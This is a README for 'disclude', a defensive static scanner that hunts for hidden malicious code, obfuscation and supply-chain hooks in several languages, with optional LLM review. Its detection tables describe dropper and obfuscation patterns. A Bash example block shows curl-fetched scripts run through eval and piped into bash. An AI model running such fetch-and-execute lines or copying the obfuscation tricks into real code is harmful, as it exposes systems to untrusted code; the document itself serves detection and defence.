# disclude

Scan source code for signs of hidden intent and obfuscation, including Unicode attacks, encoded payloads, dynamic execution patterns, and supply-chain escape hatches. This is not a general purpose vulnerability scanner: `disclude` is a static analysis tool specialized in finding hidden malicious code in C, Rust, Python, TypeScript, and Bash.

The static analyzer is implemented in fast, multi-threaded Rust, and employs three views of the code: as raw strings, as custom tokens, and as a full abstract syntax tree. An optional fourth pass sends findings to an LLM (Anthropic, OpenAI, or Ollama) to eliminate false-positives and provide confidence scores. Combining robust static analysis with targeted LLM review provides speed, cost efficiency, and excellent detection quality.


## Install

To install the CLI via Python `pip`:

```
pip install disclude
```

To instsall the CLI via Rust `cargo`:

```
cargo install disclude
```


## Output formats

**`human`**: coloured terminal output grouped by file.

**`json`**: newline-delimited JSON, one object per file. Suitable for further processing.

**`sarif`**: [SARIF 2.1.0](https://docs.oasis-open.org/sarif/sarif/v2.1.0/sarif-v2.1.0.html), compatible with GitHub Code Scanning, VS Code SARIF viewer, and most CI platforms. Every signal kind appears in the rules catalog even if no findings were produced.




## Usage

```
disclude scan <path> [options]
```

| Flag | Default | Description |
|---|---|---|
| `--format` | `human` | Output format: `human`, `json`, `sarif` |
| `--severity` | `warn` | Minimum severity to report: `info`, `warn`, `critical` |
| `--exit-code` | off | Exit 1 if any findings at or above threshold |
| `--diff <ref>` | — | Annotate findings introduced since a git ref (`main`, a tag, a SHA) |
| `--lang <lang>` | auto | Override language detection: `python`, `rust`, `ts`, `js`, `c`, `bash`/`sh`/`shell` |
| `--ignore <file>` | — | Additional ignore file (gitignore syntax) |
| `--no-raw` | — | Skip raw byte analysis |
| `--no-token` | — | Skip token-level analysis |
| `--no-ast` | — | Skip AST analysis (faster, less precise) |
| `--llm` | off | Send findings to an LLM for validation (see [LLM review](#llm-review)) |
| `--llm-provider` | auto | LLM provider: `anthropic`, `openai`, `ollama` |
| `--llm-model` | per-provider | Override the default model for the selected provider |
| `--llm-base-url` | per-provider | Override the API base URL |



### Examples

```sh
# Human-readable report, warn and above
disclude scan ./my-package

# SARIF output for GitHub Code Scanning
disclude scan ./my-package --format sarif > results.sarif

# CI gate: fail if any critical finding
disclude scan ./my-package --severity critical --exit-code

# Review only what a PR introduced
disclude scan ./my-package --diff main --exit-code

# LLM-validated scan (auto-detects provider from environment)
disclude scan ./my-package --llm

# LLM scan with a specific provider and model
disclude scan ./my-package --llm --llm-provider anthropic --llm-model claude-opus-4-7
```


## LLM review

The optional `--llm` flag adds a fourth analysis step after the three static passes. WARN and CRITICAL findings are batched (up to ~6 KB of context per request) and sent to an LLM, which enriches findings with verdict and confidence for each finding.

### Provider setup

The provider is auto-detected from environment variables in priority order:

| Provider | Key env var | Default model |
|---|---|---|
| Anthropic | `ANTHROPIC_API_KEY` | `claude-haiku-4-5` |
| OpenAI | `OPENAI_API_KEY` | `gpt-4o-mini` |
| Ollama cloud | `OLLAMA_API_KEY` | `llama3.2` |

Pass `--llm-provider` to override auto-detection, `--llm-model` to change the model, and `--llm-base-url` to point at a custom endpoint.

### Verdict scale

Each finding receives a verdict on a 0–4 axis:

| Score | Verdict | Meaning |
|---|---|---|
| 0 | `dismissed` | Clearly not a security concern |
| 1 | `likely_benign` | Common legitimate pattern, probably a false positive |
| 2 | `inconclusive` | Insufficient context to determine |
| 3 | `suspicious` | Concerning pattern, likely intentional |
| 4 | `confirmed` | Strong evidence of malicious intent |

### LLM-Augmented Output

**`human`**: a `llm [score/verdict  confidence%] summary` line is printed after each finding.

**`json`**: each finding object gains an `llm_verdict` field containing `verdict`, `score`, `confidence`, `summary`, and `reasoning`.

**`sarif`**: `llm_score`, `llm_verdict`, and `llm_summary` are added to each result's `properties`.



## Languages

Language is detected from file extension or shebang line.

| Language | Extensions | Shebang |
|---|---|---|
| Bash/Shell | `.sh`, `.bash`, `.bsh`, `.ksh`, `.zsh` | `bash`, `sh`, `ksh`, `zsh` |
| C | `.c`, `.h` | — |
| Python | `.py`, `.pyi` | `python` |
| Rust | `.rs` | — |
| TypeScript | `.ts`, `.tsx`, `.mts`, `.cts` | — |
| JavaScript | `.js`, `.jsx`, `.mjs`, `.cjs` | `node`, `deno`, `bun` |

## How it works

Each file passes through up to three static analysis layers. Later layers refine earlier ones. For example, a base64 blob found in a comment is demoted to `info` by the token pass because encoded text in comments is common and low-risk.

- **Raw pass** — byte-level: Unicode codepoints, encoded strings, entropy, line length
- **Token pass** — language-aware: reclassify raw findings by context (identifier / string / comment), emit identifier anomalies and string-concat patterns
- **AST pass** — tree-sitter: function call patterns, build scripts, install hooks
- **LLM pass** — optional: send WARN/CRITICAL findings to an LLM for false-positive validation (requires `--llm` and an API key; see [LLM review](#llm-review))

Severity levels: **critical** (high confidence attack signal), **warn** (suspicious, review recommended), **info** (low confidence or expected in some legitimate code).

## Checks

### Unicode obfuscation

These run on every file regardless of language.

| Signal | Severity | Description |
|---|---|---|
| `unicode-bidi` | critical | Bidirectional control characters (U+202A–U+202E, U+2066–U+2069). The [Trojan Source](https://trojansource.codes/) attack class — bidi overrides make code appear to do something different from what it compiles to. |
| `unicode-zero-width` | warn | Zero-width characters (U+200B ZWSP, U+200C ZWNJ, U+200D ZWJ, U+00AD soft hyphen, U+FEFF BOM outside file start). Can silently change identifier names or inject hidden content. |
| `unicode-invisible` | warn | Characters from the Unicode Tags block (U+E0001 LANGUAGE TAG; U+E0020–U+E007F). These are invisible in all common renderers and have no legitimate use in source code. Used in [IOCCC 2024 "salmon"](https://www.ioccc.org/2024/cable2/index.html) to attach invisible suffixes to macro names, making identifiers silently different from what they appear. Demoted to `info` when found inside string literals or comments. |
| `unicode-mixed-script` | warn | Identifier contains characters from more than one Unicode script (e.g. Cyrillic + Latin). Demoted to `info` inside strings/comments. |
| `unicode-homoglyph` | warn | Identifier contains characters that are visually indistinguishable from a different ASCII character (e.g. Cyrillic `а` vs Latin `a`). Demoted to `info` inside strings/comments. |

### Surrogate escape sequences

Applies to JavaScript and TypeScript string literals only.

| Signal | Severity | Description |
|---|---|---|
| `unicode-surrogate` | warn / info | `\uHHHH` escape sequences forming UTF-16 surrogate pairs. JavaScript runtimes recombine adjacent surrogate pairs at runtime — a pair such as `󠁁` evaluates to U+E0041 (TAG LATIN CAPITAL LETTER A), an invisible tag character. **Warn** when the decoded codepoint is a Tags block character; **info** for other surrogate pairs (e.g. emoji written as `😀`) or orphaned surrogates. |

### Encoded payloads

These run on every file regardless of language.

| Signal | Severity | Description |
|---|---|---|
| `encoding-base64` | warn | Base64-shaped blob in a string literal. Threshold: ≥64 chars for unpadded blobs; ≥40 chars when the blob ends with `=` or `==` padding (padding is definitive proof of base64 encoding, ruling out hex digests and identifiers). Often used to embed payloads or C2 URLs that are decoded and requested at runtime. Demoted to `info` outside string literals. |
| `encoding-hex` | warn | Long run of `\xNN` hex escape sequences in a string literal. A common way to embed shellcode or obfuscated text. Demoted to `info` outside string literals. |
| `encoding-octal` | warn | Long run of `\NNN` octal escape sequences (≥6 consecutive, minimum entropy 2.5 bits/byte). Octal is less recognizable than hex and valid in C, Python, and JavaScript — used to encode arbitrary bytes or hide printable characters (`\101` for `A`, `\012` for newline). Demoted to `info` outside string literals. |
| `encoding-escape-soup` | warn | Dense mix of arbitrary escape sequences. Indicates content that has been serialized or obfuscated to avoid plain-text grep. |

### Code structure anomalies

These run on every file regardless of language.

| Signal | Severity | Description |
|---|---|---|
| `high-complexity` | warn | String literal with unusually high Shannon entropy (high compression ratio). Raw high-entropy data in source is often an encoded payload or embedded binary. |
| `long-line` | info | Line length exceeds threshold in a file that is not a minified bundle. Lines dominated (>80%) by string/comment content are suppressed — the signal targets long *code* lines, which are a common obfuscation tactic. |
| `whitespace-anomaly` | warn | Unusual whitespace in indentation (e.g. mixed tabs/spaces, non-standard whitespace characters), or — for C — decorative internal whitespace layout where ≥ 30 % of lines have ≥ 2 runs of ≥ 4 spaces between code tokens. The decorative trigger catches IOCCC-style code that has been padded into rectangles, diamonds, or other visual shapes. Two structural-alignment filters suppress switch/case tables (one starting keyword dominates) and column-aligned data arrays (run-start columns cluster at a few fixed positions). |
| `narrow-file-charset` | warn | The file's entire printable non-whitespace character vocabulary fits within ≤ 12 distinct ASCII characters (minimum 200 bytes of content). [JSF*ck](https://github.com/aemkei/jsfuck) uses exactly 6 characters (`!()+[]`) to encode arbitrary JavaScript using type coercion — the resulting file has no readable identifiers, strings, or keywords. The message names the characters found. |

### Identifier anomalies

Token pass; language-aware.

| Signal | Severity | Description |
|---|---|---|
| `identifier-narrow-charset` | warn | Identifier composed entirely of visually confusable characters (`l`, `I`, `1`, `O`, `0`). Names like `lI1O0lI` are unreadable by design. |
| `identifier-low-length` | info | File-wide naming-shape signal. Fires when the mean non-conventional identifier length is below 2.0 over at least 20 identifiers, **or** when ≥ 40 % of non-conventional identifiers are exactly one character (over at least 30 identifiers). The second trigger catches IOCCC-style obfuscation where a sprinkling of long keywords (`extern`, `nanosleep`, `TIOCGWINSZ`) inflates the mean above 2.0 even though most globals and functions are single letters. |
| `string-concat-construction` | warn | String concatenation that reconstructs a sensitive identifier (`exec`, `eval`, `import`, `getattr`, `system`, `require`, `process`, etc.). A common pattern to dodge static keyword grep. |

### Dynamic execution — Python

AST pass; tree-sitter.

| Signal | Severity | Description |
|---|---|---|
| `dynamic-execution` | critical / warn | `exec()`, `eval()`, or `compile()` called on a non-literal value. Critical when the argument is reached via a decoder/decompressor (`base64.b64decode`, `zlib.decompress`, `codecs.decode`, …), is a runtime-concatenated string, or sits at module scope (runs on import); warn otherwise. The `re.compile(...)` library call is excluded — only the bare builtin counts. Also fires on the Python shell/process-spawn family: `os.system`, `os.popen`, `os.spawn*`, and `subprocess.{run,call,check_call,check_output,Popen}` (gated on `shell=True`), `subprocess.{getoutput,getstatusoutput}` (always shell). Critical on a non-literal command, warn on a literal. The `__import__('os').system(cmd)` chain — laundering the import to keep it out of static scans — resolves to `os.system` and is critical regardless of arg. |
| `dynamic-import` | warn | `__import__()` or `importlib.import_module()` called with a non-literal specifier. |
| `dynamic-attribute` | warn | `getattr(obj, name)` where `name` is not a string literal — runtime-resolved attribute lookup. |
| `payload-bytes-literal` | warn | A `b"..."` / `b'...'` literal whose content is dominated by `\xNN` escapes (≥32 escapes AND ≥30% of content). Real bytes literals are short and purposeful; a long, hex-dense literal is the shape of a compressed/encrypted code blob waiting to be unpacked. |
| `decoder-import-with-exec` | warn | The file imports a decoder/decompressor module (`base64`, `binascii`, `codecs`, `marshal`, `pickle`, `zlib`, `gzip`, `lzma`, `bz2`) AND calls the bare `exec`/`eval`/`compile` builtin. The combination is the multi-stage payload shape: blob → decode → run. Either piece alone is benign; together they are suspicious. |
| `frame-introspection` | critical / warn | Call-stack frame introspection: `sys._getframe`, `inspect.currentframe`, `inspect.stack`, `inspect.getouterframes`, `sys.settrace`, or `sys.setprofile`. Outside debuggers, profilers, and a small set of frameworks (`loguru`, `structlog`, `decorator`) these have essentially no legitimate use. Warn by default; elevated to critical when the same file also calls `sys.exit`/`exec`/`eval` — the bail-on-detection / decode-then-execute shape. |

### Dynamic execution — TypeScript / JavaScript

AST pass; tree-sitter.

| Signal | Severity | Description |
|---|---|---|
| `dynamic-execution` | critical / warn / info | `eval()`, `new Function()`, or `setTimeout`/`setInterval` called with a string argument (critical/warn). `atob(x)` — base64 decode at runtime (warn); the first step of the classic supply-chain pattern: store C2 URL or payload as a base64 literal, decode it, then fetch or exec. `btoa(x)` — base64 encode at runtime (info); used in exfiltration patterns. |
| `dynamic-import` | warn | `require(expr)` where `expr` is not a string literal, or `` import(`...${expr}...`) `` template. |
| `data-uri-import` | critical | `import(x)` where `x` is a string or template literal beginning with `data:` (e.g. `data:text/javascript;base64,...`). Resolves through one level of `const`/`let` indirection so `const spec = \`data:...\`; await import(spec)` is caught. A `data:` URI passed to `import()` executes arbitrary code without ever touching disk — there is no legitimate use in app or library code. Replaces the generic `dynamic-import` warn on the same call. |
| `dynamic-attribute` | warn | `process.binding(name)` — Node.js internal binding escape hatch, reaches C++ internals not exposed through the public API. |
| `proxy-global-hijack` | critical | `new Proxy(target, handler)` where `target` is one of `globalThis`, `window`, `global`, `self`, `process`, `document`, or `Object.prototype` / `Array.prototype` / `Function.prototype`. The handler interposes on every property read through that global, so the names it actually wants (`process`, `env`, …) never need to appear in source. Legitimate uses are virtually nonexistent in library or application code. |
| `tag-function-deobfuscator` | critical | A tagged template `` tag`...` `` whose `tag` resolves to a function that *transforms* its template strings — `.reverse()`, `String.fromCharCode`, `atob`, `Buffer.from`, or `parseInt(_, 16)` — rather than passing them through. Legit tag functions (`gql`, `css`, `sql`, `html`, `lit`, `styled`) parse or stitch their input; tags that decode it are the "store payload reversed/encoded inside a literal, deobfuscate at runtime" pattern. The function's first parameter must be named `strings` or typed `TemplateStringsArray`; the rule only fires when the function is actually used as a template tag in this same file. |
| `generator-yield-callable` | warn | A `function*` generator whose `yield` value is an arrow function or function expression. The driver pulls each callable out with `g.next().value!()` and invokes it, so the dispatcher's control flow is reconstructed at runtime from a sequence of small lambdas — reviewers see two short arrows, not the actual call graph. Yielding *data* values is fine; the structural tell is that what comes out of `next().value` is itself a function to call. |
| `error-stack-inspection` | warn | `(new Error()).stack` is read and a string-match method (`includes` / `indexOf` / `lastIndexOf` / `search` / `match` / `matchAll` / `startsWith` / `endsWith` / `test`) is called on the result. Resolves through one level of `const`/`let` indirection and through `\|\|` / `??` fallbacks (`const s = new Error().stack \|\| ''; s.includes('jest')`); also fires on `new <SubclassOfError>()`. Reading the stack on its own is benign — loggers and error reporters do it. The match step is the structural shape of sandbox / analyzer detection (anti-analysis code fingerprints test runners or tracing tools by their frames and gates the payload behind whether they're present). |

### Dynamic execution — Bash/Shell

AST pass; tree-sitter.

| Signal | Severity | Description |
|---|---|---|
| `dynamic-execution` | critical / warn | `eval` called with a dynamic argument — variable expansion (`eval "$VAR"`), command substitution (`eval $(cmd)`), or a word containing variable references (critical). `eval` called with a plain string literal (warn). Also fires when `exec` is called with a variable as the binary path (`exec $cmd`), since the executed binary is unknown statically (critical). |
| `dynamic-import` | warn | `source $path` or `. $path` where the path contains a variable — the sourced file is determined at runtime. |
| `dynamic-execution` (pipeline) | warn | A pipeline ending with `bash`, `sh`, `ksh`, or `zsh` — the classic "pipe to shell" dropper pattern (`curl … \| bash`). Downloads and immediately executes arbitrary code without inspection. |

**Examples:**

```bash
# CRITICAL — dynamic value reaches eval
PAYLOAD=$(curl -s https://example.com/update.sh)
eval "$PAYLOAD"

# CRITICAL — exec with variable binary path
exec $USER_SUPPLIED_BIN

# WARN — source with variable path
source $CONFIG_DIR/init.sh

# WARN — classic pipe-to-shell dropper
curl -fsSL https://example.com/install.sh | bash
```

### Dynamic execution — C

AST pass; tree-sitter.

| Signal | Severity | Description |
|---|---|---|
| `dynamic-execution` | critical / warn | `system(cmd)` or `exec*(path, ...)` (`execl`, `execlp`, `execle`, `execv`, `execvp`, `execve`) or `popen(cmd, mode)`. Critical when the argument is a variable; warn when it is a string literal. |
| `dynamic-import` | warn | `dlopen(path, flags)` with a non-literal path — dynamically loads a shared library. |
| `dynamic-attribute` | warn | `dlsym(handle, name)` with a non-literal symbol name — resolves a function pointer by name at runtime. |

### C-specific obfuscation

| Signal | Severity | Description |
|---|---|---|
| `macro-alias` | warn | Token pass. `#define <name> <replacement>` where the macro name is 1–2 characters and the replacement is a sensitive identifier (`write`, `read`, `open`, `system`, `exec*`, `popen`, `fork`, `kill`, `ptrace`, `syscall`, `dlopen`, `dlsym`, `mmap`, `mprotect`, `socket`, `connect`, `send`, `recv`, …). A common dropper trick: the syscall is renamed to a single letter so that simple keyword grep over the source misses it. Function-like macros and multi-token bodies are excluded. |
| `macro-keyword-override` | warn | Token pass. `#define <keyword> <body>` where `<keyword>` is a reserved pre-C11 keyword (`int`, `char`, `double`, `union`, `for`, `return`, …) and the replacement body is non-empty. Rebinding a keyword silently changes what every later occurrence in the file means — an IOCCC favourite (`#define double(a,b) int`, `#define union static struct`). C11+ pseudo-keywords (`_Static_assert`, `_Generic`, `_Atomic`, `_Alignas`, `_Alignof`, `_Thread_local`, `_Noreturn`) are excluded because real codebases routinely polyfill them. Empty-body shims (`#define inline`) are excluded. |
| `identifier-confusable-collision` | warn | Token pass. Two distinct identifiers in the same file collapse to the same visual skeleton after grouping confusable characters — round-O `0`/`O`/`o` and vertical-stroke `1`/`l`/`I` (lowercase `i` is excluded; its dot makes it visually distinct). Fires only when at least one position differs as digit-vs-letter (`_0` vs `_O`, `x0` vs `xO`); pure case-pair collisions like `Object`/`object` are excluded as a common C convention rather than the IOCCC digit-letter swap. |
| `numeric-literal-payload` | critical | AST pass. A wide-numeric array (≥ 8 elements of `short`, `int`, `long`, `long long`, `float`, `double`, `long double`, `wchar_t`, `size_t`, `int16_t`/`int32_t`/`int64_t`, `uint16_t`/`uint32_t`/`uint64_t`, `intptr_t`, `uintptr_t`, …) that is later reinterpreted through a byte-pointer cast (`char *`, `unsigned char *`, `signed char *`, `int8_t *`, `uint8_t *`). Hides arbitrary bytes inside what looks like a table of floating-point or integer constants. Findings are deduped per array — one report per array citing the cast count. |
| `format-string-write` | critical | Token pass. `printf`-family format string contains a `%n` write directive (`%n`, `%hhn`, `%hn`, `%ln`, `%lln`, with optional positional `%<digit>$…n`). The `n` conversion writes the byte-count-so-far into an `int *` argument — a memory write primitive seen almost exclusively in CTF/exploit code and IOCCC entries. Detected inside string literals and inside `#define` macro bodies (catches the IOCCC stringification trick `#define N(a) "%"#a"$hhn"`, where the `$hhn` directive tail is split across stringification). Comments mentioning `%n` are excluded — both standalone and embedded `/* ... */` / `// ...` inside `#define` lines. |
| `legacy-k-and-r-main` | warn | AST pass. `main()` defined without an explicit return type — pre-ANSI K&R style (`main() { ... }` or `main(argc, argv) int argc; char **argv; { ... }`). Modern C requires `int main(...)`; the implicit-int form is undefined behaviour in C99+ and is a strong indicator of intentionally archaic source (IOCCC entries) or pre-1989 code. |
| `implicit-int-function` | warn | AST pass. Three or more functions in the same file are defined without an explicit return type (pre-ANSI K&R implicit-`int`). Catches IOCCC sources where every function is shaped `Q(a){return a;}`. The single-function `main()` form is reported by `legacy-k-and-r-main`; this signal is the file-wide pattern. |
| `dynamic-format-string` | warn | AST pass. A `printf`-family call (`printf`, `fprintf`, `dprintf`, `sprintf`, `snprintf`, `asprintf`, and the `w`-wide variants) uses a non-literal format string — the classic format-string-bug shape. The `v*` variadic forwarders are excluded by design. Bare-identifier format args that resolve to a parameter or local variable of the enclosing function are excluded (legitimate format selection). SCREAMING_SNAKE_CASE names are treated as macro-defined formats and excluded, as are `i18n` wrappers (`_(...)`, `gettext(...)`, `dgettext`, `ngettext`, …). |
| `embedded-nul-in-string` | warn | Token pass. A C string literal contains an embedded NUL escape (`\0`, `\00`, `\000`, `\x00`) followed by additional non-whitespace bytes. libc string functions truncate at the NUL while the trailing bytes remain accessible through `memcpy`/length-bearing APIs — a stealth payload pattern, and an IOCCC technique for stuffing extra data into a string that still looks short. |
| `reverse-subscript-notation` | warn | AST pass. Two shapes of the C `a[b] ≡ b[a]` trick: (1) a `subscript_expression` whose left operand is a numeric literal (`2[arr]` instead of `arr[2]`) — caught directly when the surrounding parse is clean; (2) a `#define <name> [<expr>]` macro whose body is a bare bracketed fragment, used to splice a reverse subscript at every call site (`#define q [v+a]` → `2 q` ⇒ `2[v+a]`). Real code essentially never indexes a pointer with the integer on the left. Subscripts inside `ERROR` parser-recovery contexts are excluded. |
| `recursive-main-call` | warn | AST pass. `main` is called from inside another function in the same TU — recursion through `main` is an IOCCC pattern (loop using `argc`/`argv` to thread state). The runtime is the only legitimate caller of `main`. The K&R `main() { ... }` definition shape (where tree-sitter wraps the bare signature in an `ERROR` containing a `call_expression`) is excluded so the implicit-int main definition isn't misread as a self-call. |
| `stringify-dereference` | warn | AST pass. A function-like macro body contains `*#param` — the `#` operator stringifies the macro argument into a string literal, and the leading `*` dereferences it to extract the first byte. A one-character literal extraction trick used in IOCCC code (e.g. `*c == *#v` to compare a runtime char against the first letter of a macro-arg token). Token paste `##` is excluded. |

### Build-time and install-time

AST pass; language-specific.

| Signal | Severity | Description |
|---|---|---|
| `build-script-shellout` | critical | Rust `build.rs` spawns a shell command or makes a network request at compile time. Malicious build scripts are a known supply-chain vector — they run automatically during `cargo build`. Also elevated to critical when found alongside `unsafe` code in the same file. |
| `proc-macro-presence` | info | Rust crate defines a procedural macro (`proc-macro = true`). Proc-macros run arbitrary code at compile time with full access to the compiler. Informational — legitimate proc-macros are common, but they warrant extra scrutiny in untrusted dependencies. |
| `install-hook-shellout` | warn | `package.json` `preinstall`/`postinstall`/`install` script shells out to a non-trivial command. Runs automatically on `npm install`. |


## What is New


### 1.5.0

Refined Python detections with `copy_fail.py` fixture.

When using `--format sarif` and no detections are found, a valid SARIF JSON is still emitted.


### 1.4.0

LLM review now downgrades WARN and CRITICAL findings if they are determined to be "likely_benign" or "inconclusive" with 70% or more confidence.

### 1.3.0

LLM review pass (`--llm`): optional fourth analysis step that sends WARN and CRITICAL findings to an LLM (Anthropic, OpenAI, or Ollama cloud) for false-positive validation.
New Bash/Shell detections.
Glassworm-style invisible payload detection.

### 1.2.0

Updates to the public interface.

### 1.1.0

Updates to the public interface.

### 1.0.0

Initial release.


